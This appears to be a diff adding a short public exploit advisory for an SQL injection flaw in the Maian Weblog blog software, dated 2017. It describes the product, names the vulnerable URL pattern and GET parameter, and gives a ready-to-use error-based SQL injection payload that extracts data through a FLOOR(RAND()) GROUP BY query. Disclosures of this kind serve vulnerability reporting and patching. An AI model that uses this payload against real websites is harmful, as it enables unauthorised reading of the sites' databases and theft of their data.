@@ -1,0 +1,26 @@
+Introduction
+
+Exploit Title: Maian Weblog – SQL Injection
+Date: 27.01.2017
+Vendor Homepage: http://www.maianweblog.com/
+Exploit Author: Kaan KAMIS
+Contact: iletisim[at]k2an[dot]com
+Website: http://k2an.com
+Category: Web Application Exploits
+ 
+Overview
+ 
+Simple blog system for your website, Easily add/edit or delete blogs, Allow visitor comments for individual blogs, Optional e-mail notification for webmaster if comments are posted, Edit or delete visitor comments, BB Code, Calendar so visitors can view past archives, Support for multi language files, Show latest blogs/comments on blog page, Uses the Savant template engine.
+
+Type of vulnerability:
+
+An SQL Injection vulnerability in Maian Weblog allows attackers to read
+arbitrary data from the database.
+
+Vulnerable Url:
+
+http://locahost/weblog/blog/2[payload]/second-blog.html
+Mehod : GET
+
+Simple Payload:
+blog/2' AND (SELECT 2995 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(2995=2995,1))),0x717a787671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'AUvx'='AUvx/q-blog.html
